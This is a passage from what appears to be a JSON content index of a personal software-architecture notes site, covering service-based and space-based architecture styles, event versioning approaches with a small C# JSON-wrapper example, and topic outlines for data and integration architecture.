architecture of a whole system, but these styles can be also combined. One does not exclude the use of others.\nAs per usual, you need to select the style(s) based on your needs. Remember, as an architect, you must understand your needs for the system.\nMonolithic vs Distributed Architectures # Neither is better than the other, each answers a specific set of needs. The fundamental decision rests on how many quanta the architect discovers during the design process. If the system can manage with a single quantum (in other words, one set or architecture characteristics), then a monolithic architecture offers many advantages. On the other hand, differing architecture characteristics for components requires distributed architecture to accommodate the differing architecture characteristics.\nThe ability to determine a fundamental design characteristic of architecture (monolith vs distributed) early in the design process highlights one of the advantages of using the architecture quantum as a way of analyzing architecture characteristics scope and coupling.\nRead about components that can assist in the thought process in identifying your components and what architectural style might be more suitable. You can\u0026rsquo;t understand architectural styles without understanding Architecture Characteristics and components.\nDistributed Architecture Considerations # Wiki Page\nThe 8 Fallacies:\nThe Network Is Reliable (Illustration) Latency Is Zero (Illustration) Bandwidth Is Infinite (Illustration) The Network Is Secure (Illustration) The Topology Never Changes (Illustration) There Is Only One Administrator (Illustration) Transport Cost Is Zero (Illustration) The Network Is Homogenous (Illustration) Other considerations:\nDistributed logging Distributed transactions Contract maintenance and versioning (evolution) Physical units vs Logical Components # A logical component is a grouping of responsibilities (namespace), the physical units refers to units of deployability (e.g. JARs or DLLs). Physical units can still co-exist on the same host. They don\u0026rsquo;t need to be distributed over different hosts.\nStyles Comparison # Characteristic/Name Ball Of Mud Layered Pipeline Microkernel Service-Based Event-Driven Space-Based Orchestration-Driven Service-Oriented Microservices Monolithic/Distributed Monolithic Monolithic Monolithic Monolithic Distributed Distributed Distributed Distributed Distributed Partitioning Type None Technical Domain \u0026amp; Technical Domain Technical Domain \u0026amp; Technical Technical Domain Domain Number of quanta 1 1 1 1 1 to many 1 to many 1 1 One to many Deployability â­ â­ â­â­ â­â­â­ â­â­â­â­ â­â­â­ â­â­â­ â­ â­â­â­â­ Elasticity â­ â­ â­ â­ â­â­ â­â­â­ â­â­â­â­â­ â­â­â­ â­â­â­â­â­ Evolutionary â­ â­ â­â­â­ â­â­â­ â­â­â­ â­â­â­â­â­ â­â­â­ â­ â­â­â­â­â­ Fault Tolerance â­ â­ â­ â­ â­â­â­â­ â­â­â­â­â­ â­â­â­ â­â­â­ â­â­â­â­ Modularity â­ â­ â­â­â­ â­â­â­ â­â­â­â­ â­â­â­â­ â­â­â­ â­â­â­ â­â­â­â­â­ Overall cost â­ â­â­â­â­â­ â­â­â­â­â­ â­â­â­â­â­ â­â­â­â­ â­â­â­ â­â­ â­ â­ Performance â­ â­â­ â­â­ â­â­â­ â­â­â­ â­â­â­â­â­ â­â­â­â­â­ â­â­ â­â­ Reliability â­ â­â­â­ â­â­â­ â­â­â­ â­â­â­â­ â­â­â­ â­â­â­â­ â­â­ â­â­â­â­ Scalability â­ â­ â­ â­ â­â­â­ â­â­â­â­â­ â­â­â­â­â­ â­â­â­â­ â­â­â­â­â­ Simplicity â­ â­â­â­â­â­ â­â­â­â­â­ â­â­â­â­ â­â­â­ â­ â­ â­ â­ Testability â­ â­â­ â­â­â­ â­â­â­ â­â­â­â­ â­â­ â­ â­ â­â­â­â­ Shifting fashion in architecture # Preferred styles shift over time, driven by following factors:\nObservations from the past: Experience and observations of the past usually guides architects on finding solutions to these deficiencies that they experience. Changes in the ecosystem: These changes can remove/ease existing paint points or introduce new challenges. The introduction of Kubernetes allowed for lots of automation of automation. New Capabilities: Usually small and hidden new capabilities that shift radically what is possible or how things can work. Containers might have seemed just a natural evolution on virtual machines, but it had an enormous impact on the industry. Acceleration: Change is constant, but the velocity is always increasing of changes in the ecosystem. Resulting in new tools, engineering practices, with new design and capabilities. Domain Changes: The business changes, and its domain which developers constantly adapt to. Like mergers in companies. Technology Changes: Organizations try to follow some of the technological changes for their obvious benefits. External Factors: Maybe a design is just perfectly fine, but the licensing might change or the sun setting of vendor products, regulation, and conformity with standards can demand changes. Always have an understanding of current industry trends and on how they make sense. Decide on a style # As we might have expected IT DEPENDS which one we choose an various factors like characteristics and which trade-off we are prepared to make. This section is some general advise.\n1. Factors to be comfortable with # The Domain: Understand important aspects of the domain, especially those affection operational architecture characteristics. No need to be subject experts, but have a good understanding of the major aspects. Architecture characteristics that impact structure: Discover and clarify the architecture characteristics needed to support the domain and external factors. Data Architecture: Data architecture is a specialization of its own. However, architects must understand the impact that data design might have on their design, particularly if the new system must interact with an older/existing data architecture. Organizational Factors: Budgets can influence the design, or vendor selection (licenses), or plans for merger \u0026amp; acquisitions might desired open solutions and integration architectures. Knowledge of process, teams, and operational concerns: Conway\u0026rsquo;s Law, maturity in engineering practices, how teams are build will have an influence. A monolith is much harder with 10 squads than maybe one. Domain/Architecture isomorphism: Some problem domains match the topology of the architectural style, or be ill-suited for given style. 2. Determinations to be made # Monolith vs Distributed: Will a single set of architectural characteristics suffice ? Monolith will suffice. If different parts of the system needs different architectural characteristics, distributed is most likely the answer. Where should data live?: In monolith, all data lives in one or few databases. In distributed, one must determine where data is persisted, and how it will flow. This means you must consider structure and behavior when designing an architecture. Don\u0026rsquo;t be fearful of iterating. We call this also data partitioning. What communication styles? (Sync vs Async): Once data partitioning is determined, what are the communication styles that we prefer? Synchronous communication presents fewer design, implementation, and debugging challenge. Default to synchronous when possible and use asynchronous when necessary. Decision Framework Between 2 Styles # Here is an example of a more objective and rational guidance approach to decide between 2 architecture styles.\nYou can list the key characteristics that we need to decide on. The lower rating would lean towards style 1 and the higher rating to style 2.\n"},{"id":75,"href":"/software-architecture/architecture-styles/service-based/","title":"Service Based","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Service-Based # Description # Is a \u0026ldquo;hybrid\u0026rdquo; of the microservices architecture style. It\u0026rsquo;s very pragmatic, flexible, but has one of the lowest complexity and cost of all distributed architecture style, making it a popular choice for business-related applications.\nBasic topology of service-based architecture follows a distributed macro layered structure, consisting of a separately deployed user interface, distinct services, and a monolithic database. Services in this architecture are usually \u0026ldquo;domain services\u0026rdquo;, covering a specific part of the general domain. All services are independent and separately deployed.\nAs a shared database is used, the number of services within an application context are generally between 4 and 12, averaging at 7 services.\nCommunication between the UI and the components usually are REST, RPC, SOAP, or messaging busses. Generally the user interface access the services directly using a service locater pattern, API Gateway, or Proxy.\nDue to the relative small amount of services, the DB connections are often not a bottleneck. Making changes however comes with challenges.\nVariants # This is a flexible architecture style, therefore many variants exist.\nBreak apart the User Interface Break apart the Database Important: There should not be data in a database that use used by other services, when partitioning to this degree. Nor redundant data. It is crucial to avoid interservice communication between services. If required, you might want to consider the microservice architecture style instead. Add an API layer These variants show that with this flexibility, one can design for scalability, fault tolerance, and security, by putting a specific database in a non public network.\nDifference with Microservice Architecture Style # In the Service Based Architecture style, all business logic is carefully located in a business domain, related to that domain. Therefore, a single (domain) service can use the ACID transaction properties for implementing any logic. Notice therefore, why in service based, interservice communication should be prohibited at all costs.\nMicroservice Style allows interservice communication, meaning, that you loose the ACID transaction properties and depend on sagas and the BASE transaction properties. In Service based a single domain service would be responsible for example, an order, this OrderService would be responsible for the order, but also the payment and many other relevant responsibilities. In microservice style, these responsibilities would be most likely spread across multiple services.\nDue to the limitation of no interservice communication, services are more \u0026ldquo;coarse-grained\u0026rdquo;, meaning they take on more responsibility, are less \u0026ldquo;Specialized\u0026rdquo; and there might be duplication in functionality to avoid having to rely on interservice communication.\nDatabase Partitioning # As multiple services depend on the same, central, monolith database, it will be challenging to make changes to the databases while not causing problems for other services. Proper database partitioning is not mandatory, but can be of great help to mitigate some off these challenges.\nIn many languages you might have some \u0026ldquo;single shared library\u0026rdquo; with all the database entities that exist in your database. If one schema changes, this \u0026ldquo;single shared library\u0026rdquo; is updated, which causes ALL the domain services to be modified/affected. Hence, with logical portioning, you can have shared entity libraries and libraries per service domain, which decreases the impact of a single change to the database schema.\nSingle Shared Library Diagram Multiple Shared Library Diagram When To Use # Excellent architecture style which is flexible, use this when you a have bigger, more complex domain and application boundary. Yet, you don\u0026rsquo;t want/cant afford the operational cost and technical challenges that other distributed architecture styles impose (e.g. Microservice style). Business application (landscapes) are usually a great fit. Natural fit for for DDD. When NOT To Use # When you can\u0026rsquo;t afford the cost, complexity, and skills that come with the more \u0026ldquo;fancy\u0026rdquo; and expansive distrusted architecture styles. It\u0026rsquo;s not only about \u0026ldquo;not being able to afford\u0026rdquo;, but also \u0026ldquo;Do I really need this high level of complexity\u0026rdquo;. There is no shame in not taking the most \u0026ldquo;advanced\u0026rdquo; approach. Considerations # Important to read the Difference with Microservice Architecture Style note.\nThis is a lighter approach to microservice architecture style. It imposes some limits, it makes your services bigger, but you can work with plan old ACID transactions. Due to the imposed limitations, you take a lot of complexity of the table, which can be a key advantage. Working with fine-grained services comes with a whole set of challenges, which you might not want to tackle, or neither can afford their cost.\nYou have a distributed style, but transactions are contained within a single domain service, yet having high modularity and many other distributed advantages. You won\u0026rsquo;t have to deal with \u0026ldquo;orchestration\u0026rdquo; or \u0026ldquo;choreography\u0026rdquo; for transactions across various fine grained services.\nCharacteristics # Characteristic Rating Partitioning Type Domain Number of quanta 1 to many Deployability â­â­â­â­ Elasticity â­â­ Evolutionary â­â­â­ Fault Tolerance â­â­â­â­ Modularity â­â­â­â­ Overall cost â­â­â­â­ Performance â­â­â­ Reliability â­â­â­â­ Scalability â­â­â­ Simplicity â­â­â­ Testability â­â­â­â­ Resources # None\n"},{"id":76,"href":"/software-architecture/architecture-styles/space-based/","title":"Space Based","section":"Software Architecture","content":"\u0026laquo; Back To Overview\nArchitecture Style: Space-Based # Description # This architectural style comes from the notion that in traditional web faced applications, the database is the ultimate bottleneck which is expensive and complex. When a load of traffic comes in, one would first scale the web servers, afterwards the application servers and last the database servers. So we just move the scaling issue from the front tier to the database tier. For many systems this might not be a real concern, however high-volume applications with large concurrent user load will ultimately run into the database limitations.\nSpace-Based is specifically designed to address these problems involving high scalability, elasticity, and high concurrency issues. Also useful for applications that have variable, unpredictable concurrent user volume. Solving the extreme and variable scalability issue architecturally is often a better approach than trying to scale out a database or retrofit caching technologies into a nonscalable architecture.\nTopology # Name is based on the concept of tuple space, the technique of using multiple parallel processors communicating through shared memory.High scalability, high elasticity, and high performance are achieved by removing the central database as a synchronous constrain in the system and instead leveraging replicated in-memory data grids. Applications data is kept in-memory and replicated among all the active processing units*. When a processing unit updates data, it asynchronously sends that data to the database, usually via messaging with persistent queues. Processing units start up and shut down dynamically as user load increased and decreases, thereby addressing variable scalability. Because there is no central database involved in the standard transactional processing of the application, the database bottleneck is removed, thus providing near-infinite scalability within the application.\nThere are 5 core architecture components:\nProcessing Unit: Containing the application code Virtualized Middleware: To manage and coordinate the processing units Data Pumps: To asynchronously send updated data to the database Data Writers: To perform the updates from the data pumps Data Readers: To read database data and deliver it to the processing units upon startup. 1. Processing Unit (PU) # Diagram\nContains (entire or portions) of the application logic (including web based components and backend logic). Small webapps might be in a single PU, larger may split functionality in multiple PU based on functional areas. A PU could also be a single-purpose service (e.g. Microservice). If PUs have different logic, then we talk about different PU types. PUs can communicate between each other.\nIn addition it contains in in-memory data grid and replication engine usually implemented through products like Hazelcast, Apache Ignite or Oracle Coherene.\n2. Virtualized Middleware # Handles the infrastructure/operational concerns within the architecture. These components can be self written or COTS.\n2.1 Messaging Grid: Manages input request and session state. When a request is received, the messaging grid will decide to which PU the request should be forwarded. This can be round-robin or more complex algorithms, usually implemented using a typical web server with load balancing (e.g. Nginx, HA Proxy). 2.2 Data Grid: Perhaps most crucial and important component. This is the controller for the data grids found in the PU and their synchronization. Based on the data grid, it might be that no \u0026ldquo;central controller\u0026rdquo; is required, but usually it is. The idea is that data is replicated in all PUs. All PUs are aware of each other, and when a (named) cache is updated, that update is propagated immediately across all other PUs. Ensuring all named caches to be in sync. 2.3 Processing Grid [optional]: Responsible for orchestrated request processing, for when a requests needs multiple PU types for processing a request (e.g. Order Processing Unit and Payment Processing Unit). 2.4 Deployment Manager: Responsible to shut down or start up new UP based on load. This is your auto-scaling logic.\n3. Data Pumps # Diagram\nA processing unit updates its cache, the cache then needs to propagate this to shared cache, and then this change must be propagated to the database. SO this change is send to a data pump. Processing units don\u0026rsquo;t read/write from/to the database. These pumps are usually implemented using messaging. Multiple pumps might exist, dedicated to certain (Sub)-domains or other scope/modelling logic. Pumps usually have associated contracts.\n4. Data Writers # Diagram: General Data Writer Diagram: Dedicated Data Writers\nAccepts the updates from the data pumps and processes them in the database. The granularity of the data writers depend on the scope of the data pumps and processing units. A single data write can also accept from multiple data pumps that all have their own scope.\n5. Data Readers # Diagram\nSend reading data from database to processing units via reverse data pump. Data readers are invoked under following situations:\nA crash of all processing units instances of the same named cache A redeployment of all processing units within the same named cache Retrieving archive data not contained in the replicated cache. Just like data writers and pumps, these can be scoped on arbitrary domains.\nData Collisions # See * Fundamentals of Software Architecture: Chapter 15 for detailed calculations and the variables that impact that.\nCloud vs On-Premise Implementations # Diagram\nUnique to this architecture, one can place the database on-prem and all the other PUs and Virtualized middleware on the cloud for scalability. This can assist in regulatory and security concerns.\nReplicated vs Distributed Caching # Space-based architecture mostly depends on replicated caching, although distributed caching can be used as well. Both can be also used based on the PU types. Consider leveraging based on the domain/functionality what caching strategy works best, See the optimization row in the table below.\nDecision Criteria Replicated Cache Distributed Cache Optimization Performance Consistency Cache Size Small (\u0026lt;100 MB) Large (\u0026gt;500MB) Type of data Relatively static Highly dynamic Update Frequency Relatively low High update rate Fault Tolerance High Low Replicated Caching # Diagram\nEach PU contains its own in-memory data grid that is synchronized between all processing units using the same named cache. When an update happens to that named cache in any of the PUs, other PUs are automatically updated with that information. THis is not extremely fast, but has high level of fault tolerance as there is no single point of failure.\nThis is the default model, however, in some situations, distributed cache is more desireable.\nDistributed Caching # Diagram\nThis is used when there is high data volumes (size of cache) and high update rates to the cache data. Internal memory caches in excess of 100 MB might start to cause issues as the amount of memory used buy each PU becomes high. When these (RAM) memory issues occur, update rate of the cache data is too high, the data grid might be unable to keep up. In these situations you need distributed cache most likely.\nThis requires an external server or service for the central cache server which is distributed underneath. Since the cache is not co-located in the PU, there might be a lower access speed.\nNear-Cache Considerations # Diagram\nNear-cache is a type of hybrid model bridging in-memory data grids with a distributed cache.\nThe distributed cache is referred to as Full backing Cache. Each in-memory data grid contained within each PU is referred to as the front cache. The front cache contains smaller subsets of the full backing cache, using an eviction policy. MRU: Most Recent Used MFU: Most Frequent Used RR: Random Replacement PUs don\u0026rsquo;t synchronize data not between each other! Goes all via the Caching server. This creates inconsistencies in performance and responsiveness between PUs because each PU contains different data in the front cache. For this reason near-cache model is not advised for space-based architecture.\nWhen To Use # When there is high variability in user load, and when the load is high, they all access similar data. Like a ticket sale, for a short while as tickets are released, suddenly a lot of communication must happen on how many tickets are still available, the places etc\u0026hellip; PUs can be assigned/allocated to a specific ticket sale, or a bidding process. When there is an (insane) high concurrent user volume that has to read and write similar data or the same data. Can easily deal with millions of concurrent users. Considerations # This is a very complicated and technical style.\nCharacteristics # Characteristic Rating Partitioning Type Domain \u0026amp; Technical Number of quanta 1 Deployability â­â­â­ Elasticity â­â­â­â­â­ Evolutionary â­â­â­ Fault Tolerance â­â­â­ Modularity â­â­â­ Overall cost â­â­ Performance â­â­â­â­â­ Reliability â­â­â­â­ Scalability â­â­â­â­â­ Simplicity â­ Testability â­ Resources # Fundamentals of Software Architecture "},{"id":77,"href":"/software-architecture/blog-ideas/","title":"Blog Ideas","section":"Software Architecture","content":" Blog Ideas # Shortlist of ideas on what to write or blog about.\nKey Components of systems and where we find these similarities. # Systems have componenents/sub systems, and the communication between each of those is relevant. We do this in architecture, in Team topologies we see the same analogy. We identify systems, and teams which are sub systems on their own, and we talk also on the communication channels. System\nSub systems/components Relations/communication/Interactions relation \u0026hellip; Blog about this! Explain core concepts of systems thinking first, then how we see this in all technical fields.\nHow you can derive characteristics and desired characteristics of a system.\nNow that we understand the concepts in a system, the relations, how it works, and how to manipulate\u0026hellip; how do we now design? How can we consciously guide the design of a system?\nDraft current system Draft current characterisstics Draft desired characteristics Draft desired design Design guideliness and principles ? Link these to archetypes that we have in systems thinking. Fields: Architecture, Threat Modelling, Team Topologies, DDD, The Scrum framework, \u0026hellip;\nHow you can also jump over to business about this.\nHow looking at the more generic/abstract \u0026ldquo;systems Lens\u0026rdquo; and how this allows to create new \u0026ldquo;thinking frameworks\u0026rdquo; and \u0026ldquo;concepts\u0026rdquo;.\nCoupling types ?\nBehavioral coupling - External dependencies in internal processes Temporal coupling - One entity requires other entities to be performant to fulfill it\u0026rsquo;s own performance requirements Implementation coupling - Having to change multiple entities as a consequence of changing a single entity "},{"id":78,"href":"/software-architecture/data-architecture/readme/","title":"Readme","section":"Software Architecture","content":" Data Architecture # Ideas # Data Mesh \u0026hellip; Introduction to Data Architecture:\nDefinition and significance of data architecture Role and responsibilities of a data architect Historical evolution: Traditional databases to big data and beyond Foundational Data Concepts:\nData models: relational, hierarchical, network, object-oriented, etc. Data schemas: star schema, snowflake schema, and galaxy schema Data normalization and denormalization Relational Databases \u0026amp; SQL:\nBasics of relational databases SQL (Structured Query Language) deep dive ACID properties (Atomicity, Consistency, Isolation, Durability) NoSQL Databases:\nTypes: Document, Key-Value, Column-family, Graph CAP theorem (Consistency, Availability, Partition tolerance) Use cases and best practices for NoSQL Data Warehousing \u0026amp; Big Data:\nData warehousing concepts: ETL vs. ELT Big Data ecosystems: Hadoop, Spark, and others Data lakes: concepts, benefits, and challenges Data Mesh \u0026amp; Decentralized Data Systems:\nThe concept of treating data as a product Domain-oriented decentralized data infrastructure Real-time Data Processing:\nStream processing fundamentals Tools like Kafka, Apache Flink, and Apache Storm Data Governance \u0026amp; Quality:\nData governance frameworks Data lineage, metadata management, and cataloging Data quality metrics, processes, and tools Data Security \u0026amp; Privacy:\nEncryption, masking, and tokenization Data access controls and permissions Compliance considerations (GDPR, CCPA, etc.) Master Data Management (MDM):\nDefinitions and importance MDM processes, tools, and best practices Data Integration \u0026amp; Interoperability: Data lakes, hubs, and marts Integration techniques: batch, real-time, virtual, etc. Cloud Data Platforms: Cloud data storage solutions Data processing in the cloud: serverless, managed services Data Modeling Tools \u0026amp; Techniques: ER diagrams, UML, and other modeling tools Data dictionary and metadata management Emerging Data Trends \u0026amp; Technologies: AI and machine learning\u0026rsquo;s role in data architecture Graph databases and knowledge graphs Edge computing and data considerations Optimizing for Performance \u0026amp; Scalability: Indexing, partitioning, and sharding Cache strategies and technologies Case Studies \u0026amp; Real-world Scenarios: Analyzing real-world data challenges and solutions Success stories and lessons from data project failures\nResources # Data Mesh Principles Data Mesh Book "},{"id":79,"href":"/software-architecture/integration-architecture/events/readme/","title":"Readme","section":"Software Architecture","content":" Events and Event Sourcing # This section goes deeper into events, event-sourcing, and related topics. If you want to know more about the architectural style \u0026ldquo;Event-Driven\u0026rdquo; that strongly leans on events, see the Event-Driven Architectural Style\nEvents vs Event Sourcing # Events are used as a method of communication between different parts of a system. An event is a significant change in state or an important occurrence that other parts of the system might need to know about. Event sourcing is a design pattern where the state of a business entity is persisted as a sequence of state-changing events. Whenever the state of a business entity changes, a new event is appended to the list of events.\nEvent\u0026rsquo;s primary goal is to enable loose coupling between different components or services.\nEvent Sourcing\u0026rsquo;s primary goal is to ensure complete traceability and auditability of all changes made to the entity\u0026rsquo;s state. It allows the system to reconstruct past states by replaying the events.\nTopics # Event Versioning [TODO] Event Modeling [TODO] Event Stores/Sourcing ? \u0026hellip; Resources # What Is Event Modeling "},{"id":80,"href":"/software-architecture/integration-architecture/events/versioning/","title":"Versioning","section":"Software Architecture","content":" Event Versioning # Why? # To avoid big bang releases.\nRules # A new version of an event must be convertible from the old version of the event. If not, it is not a new version of the event but rather a new event.d) Any version of any event should be convertible from any version of a given event. If you find yourself trying to figure out how to convert your old event (Evil Kinevil jumping over a school bus on a motorcycle) to your new version of the event (a monkey eating a banana) and you canât, this is because you have a new event and not a new version of it. Following this rule you can always upcast. At any given point in time, you must only handle the version of the event you understand and ignore all others (to allow for Double Writes, so old and new version is published). For most systems, a simple human-readable format such as json is fine for handling messages. Most production systems use mapping with either XML or json. Mapping with weak-schema will also remove many of the versioning problems associated with type-based strong schema discussed in the previous chapter.\nThere are scenarios where, either for performance reasons or in order to enable data to âpass throughâ without being understood, a wrapper may be a better solution than a mapping, but it will require more code. This methodology is, however, more common with messages, where an enrichment process is occurring, such as in a document-based system.\nOverall though, there are very few reasons why it may be considered for the type-based mechanism. Once brought out of your immediate system and put into a serialized form, the type system does very little. The upcasting system is often difficult to maintain amongst consumers; even with a centralized schema repository, it requires another service. In most scenarios where messages are being passed to/from disparate services, late-binding tends to be a better option.\nGeneral Tips # Only having additive changes as opposed to destructive ones. Mapping Events Between Versions # You can do the mapping logic of an event between versions (e.g. OrderPlaced v1 and v2) on one of these two layers in your stack:\nData Layer: You take an event stream and migrate/copy all this events into a new event stream with a new format. During this process, one can join/split streams and such if desired. This is like a traditional data migration of a database, without editing the table in place, but rather creating a new table where you copy the new version into. In the Application Layer the schema of the event has to be updated to reflect the schema of the new stream. Application Layer: You don\u0026rsquo;t change the original events but deal with versioning at run-time on application level. Versioning Approaches # # Name Layer Communication Direction 1 Strong Schema - Basic Type Based Versioning Application Uni-directional 2 Weak Schema - Mapping Application Uni-directional 3 Weak Schema - Wrapper Application Uni-directional 4 Negotiation Application Bi-directional 5 Copy and Replace Data Not Applicable 1. Strong Schema - Basic Type Based Versioning # Description # Assumes your serializer has no support for versioning. Explicit versions of a data schema are defined (e.g. v1, v2, \u0026hellip;) Data schema is expected to match 1:1 with the serialized type (e.g. WalletCreatedEvent). Multiple versions of a single schema are possible, but a type per version is required (e.g. WalletCreatedEvent_v1 and WalletCreatedEvent_v2). A new version of an event must be convertible from the old version of the event. If not, it is not a new version of the event but rather a new event. Upcasting logic : The logic to convert from an old to a new version is upcasting logic. The Ports/Adapters architecture allows you to decouple the version specific type (e.g. WalletCreatedEvent_v1) from your core business logic. Isolating your core from version changes. Alternatively you only pass the latest version (e.g. WalletCreatedEvent_latest), cause any old version should be able to be converted to the latest version. Double Publish: Avoid the issues that arise from having old consumers that do not understand the new version of the event. The idea is to have the new version of the producer write both the _v1 and the _v2 versions of the event when it writes. Downstream consumers can decide to ignore the newer version. Pro # todo\u0026hellip; Con # If versions are not managed, it can become a mess (e.g. WalletCreatedEvent_v1 \u0026hellip; WalletCreatedEvent_v17) - method explosion in the upcasting logic. Serialize an Enum with a value that is not supported yet in the local strong schema requires dedicated logic. All consumers must be updated to understand the schema before a producer is updated. Upcasting is difficult to maintain. 2. Weak Schema - Mapping # Description # Probably the better \u0026ldquo;Default\u0026rdquo; option. Assumes your serializer can have support for versioning. More rules that must be followed (than Strong Schema), it also offers more flexibility, providing the rules are followed. When mapping, you look at the json and at the instance: Exists on json and instance -\u0026gt; value from json Exists on json but not on instance -\u0026gt; NOP/Ignore Exists on instance but not in json -\u0026gt; default value Only the current version of a data schema is defined (so no WalletCreatedEvent_v1 \u0026hellip; WalletCreatedEvent_v17, just WalletCreatedEvent). That current version and the latest version are the same here, however that might not be reality. Data schema is not expected to match 1:1 with the serialized type (e.g. WalletCreatedEvent). Rule: You are no allowed to rename an attribute, unless you provide the old and name attribute with exact same value, but that translates in extra complexity, and is frankly, just annoying. Validation: You might need validation logic that validates if (after mapping) the mandatory fields are present/set and if to apply the correct defaults for absent fields. Pro # Relatively easy to implement with a \u0026ldquo;custom\u0026rdquo; JSON parser, default values, and/or a fluent API. Con # Serialize an Enum with a value that is not supported yet in the local strong schema requires dedicated logic. 3. Weak Schema - Wrapper # public class WalletCreatedEvent { private JObject _json; public WalletCreatedEvent(string json){ _json = JObject.parse(json); } public Guid Id { get {return Guid.Parse(_json[\u0026#34;id\u0026#34;]);} set {_json[\u0026#34;id\u0026#34;] = value.ToString();} } public string Name { get {return _json[\u0026#34;name\u0026#34;];} set {_json[\u0026#34;name\u0026#34;] = value;} } } Description # Assumes your serializer can have support for versioning. More rules that must be followed (than Strong Schema), it also offers more flexibility, providing the rules are followed. In essence, you create a wrapper around the generic JSON object (e.g. JObject) with your Getters/Setters that either read/write the value from the JSON object at access time. In these Getter methods, logic can be placed for default values for missing fields. Only the current version of a data schema is defined (so no WalletCreatedEvent_v1 \u0026hellip; WalletCreatedEvent_v17, just WalletCreatedEvent). That current version and the latest version are the same here, however that might not be reality. Data schema is not expected to match 1:1 with the serialized type (e.g. WalletCreatedEvent). Rule: You are no allowed to rename an attribute, unless you provide the old and name attribute with exact same value, but that translates in extra complexity, and is frankly, just annoying. Pro # Can serialize an Enum with a value that is not supported yet in the local strong schema. You can \u0026ldquo;pass through\u0026rdquo; the original JSON/XML and pass it on for serialization, this way, the entire original structure is kept that was not used by the internal model of that event in your service. Common for document-based systems. Con # More work than Weak Schema - Mapper or Strong Schema. The internal implementation of the wrapper might warrant memory efficient implementation in high-performance systems (e.g. JObject.Parse() might not be most memory efficient) Some formats (e.g flatbutters) might only allow you to evolve a schema by appending to the end of the schema. (Such formats might be enforced by the need for efficient implementation). 4. Negotiation # Description # Assumes Bi-Directional communications. We assume Atom Feeds as an example of this approach. Consumer can negotiate the format of the message which the message arrives in. Most common transport layer of such negotiation is HTTP. Atom Feeds are a good example of this. In a request a header can be used as Accept: \u0026lt;some format\u0026gt;+\u0026lt;some version of the format\u0026gt; (e.g. Accept: WalletCreated_JSON+v2). An atom feed response returns uri's which allows you to page through all events of a given stream. URIs will have the right parameters in the url regarding paging (e.g. /stream/page_1). TIP: You can implement this entire pattern on top of other transports, even message queues. The key is that the payload is not send via the main feed, but an URI/accessor instead. e.g. WalletCreatedEvent{ id: \u0026#39;\u0026lt;some-message-id\u0026gt;\u0026#39;, type: \u0026#39;WalletCreatedEvent\u0026#39;, uri: \u0026#39;/messages/\u0026lt;some-message-id\u0026gt;\u0026#39; } This allows for doing a GET request with content negotiation to the resource in desired format and version. alternatively the message already exposed negotiation: WalletCreatedEvent{ id: \u0026#39;\u0026lt;some-message-id\u0026gt;\u0026#39;, type: \u0026#39;WalletCreatedEvent\u0026#39;, uri_json: \u0026#39;/messages/json/\u0026lt;some-message-id\u0026gt;\u0026#39;, uri_xml: \u0026#39;/messages/xml/\u0026lt;some-message-id\u0026gt;\u0026#39; } An announcement message is sent over the queue or previously over the Atom feed. Upon receipt of the announcement, the client must then fetch the message in the format they prefer. While quite flexible, this method is less than optimal in terms of performance, as it requires a request per message. For scaling, there are methods for a consumer to pre register what content-types it is open to support, so not every request there is a content negotiation. The producer will have to have downcast and/or upcast logic for the consumers and their requested type. Limit the amount of supported versions to avoid version conversation code to blow up. Pro # The producer instead of all the consumers, must \u0026ldquo;know all formats and versions\u0026rdquo;. The Consumers only their requested format and version of choice. Many of the URIs can be cached, allowing for easy scalability, cause there might be many consumers calling the producer. Con # More complex and effort. Requires some extra effort to optimize at high performance systems (e.g. negotiate in advance), but can work! 5. Copy And Replace # \u0026hellip; todo\nDescription # Pro # Con # General Concerns # Versioning Of Behavior # If you find yourself putting branching logic or calculation logic in a projection, especially if it is based on time, you are probably missing logic in the creation of that event. A good example is the calculation of an invoice with Tax. The tax value might change over time. Make sure the event lists the tax value that was used, cause this value might change over time in the code. It may be worth including a description field even if only a string that describes the type of calculation made.\nExterior Calls # Exterior calls are seldom idempotent. Try to model the event post external call to contain all the information necessary so that downstream wise, you can replay with the result of the exterior call (e.g. PaymentSucceededEvent). Note that some information is just not allowed to be stored (credit card details).\nA related problem to this happens when projections start doing lookups to other projections. If you find a projection making calls to external services or to other projections it will be a problem to replay later. As example there could be a customer table managed by a CustomerProjection and an orders table managed by an OrdersProjection. Instead of having the OrdersProjection listen to customer events the decision was made to have it lookup in the CustomerProjection what the current Customer Name is to copy into the orders table. This can save time and duplication in the OrdersProjection code.\nChanging Semantic Meaning # One important aspect of versioning is that semantic meaning cannot change between versions of software. There is no good way for a downstream consumer to understand a semantic meaning change. An example would be that the value for the temperature field went from Celsius to Fahrenheit.\nSnapshots # If you make snapshots for read efficiency, consider to still keep the original events, in case snapshots need to be regenerated or evolve over time.\nIn general, you can delete the old snapshots and then regenerate all snapshots based on updated logic/domain. If you need it side by side (an old an new version of a snapshot), regenerate the new snapshots and make sure you can handle both snapshot models in production. At a later stage the older snapshot model can be deprecated.\nAvoid \u0026ldquo;and\u0026rdquo; # If an event has \u0026ldquo;and\u0026rdquo; in the name (e.g. TicketPaidForAndIssued) consider to split into separate events. There is no need for a 1:1 relationship to \u0026ldquo;event received \u0026gt; process \u0026gt; output single event\u0026rdquo;. Sometimes there are no output events necessary or multiple might.\nResources # Versioning in an Event Sourced System - Gregory Young "},{"id":81,"href":"/software-architecture/integration-architecture/readme/","title":"Readme","section":"Software Architecture","content":" Integration Architecture # Topics # Events \u0026amp; Event Sourcing Ideas To cover # * Service Mesh * Event driven * Request-Reply * ... Introduction to Integration Architecture: Definition and importance Historical context: From monolithic to modular to microservices and beyond Types of Integration: Point-to-point vs. hub-and-spoke Batch integration Real-time integration Synchronous vs. asynchronous communication Integration Patterns and Styles: Enterprise Integration Patterns (EIP) â e.g., Message Broker, Publish/Subscribe, Dead Letter Channel, etc. Integration styles: Database, File transfer, Shared API, Messaging, etc. Service-oriented architecture (SOA) and event-driven architecture (EDA) APIs \u0026amp; Services: REST, SOAP, GraphQL API Gateways and Management Versioning strategies OAuth, JWT, and API security Middleware \u0026amp; Brokers: Message queues (e.g., RabbitMQ, Kafka) Enterprise service bus (ESB) Integration Platforms as a Service (iPaaS) Service Mesh: Introduction to Service Mesh Implementations like Istio, Linkerd, and Consul Connect Use cases, benefits, and drawbacks Data Integration: ETL (Extract, Transform, Load) processes ELT (Extract, Load, Transform) processes Data lakes, data warehouses, and data hubs Streaming data and real-time analytics Integration Security: Secure data transmission Data masking and tokenization Identity and access management in integration contexts Monitoring, Logging, and Tracing: Importance of observability in integration scenarios Tools and practices for monitoring integrated systems Distributed tracing (e.g., 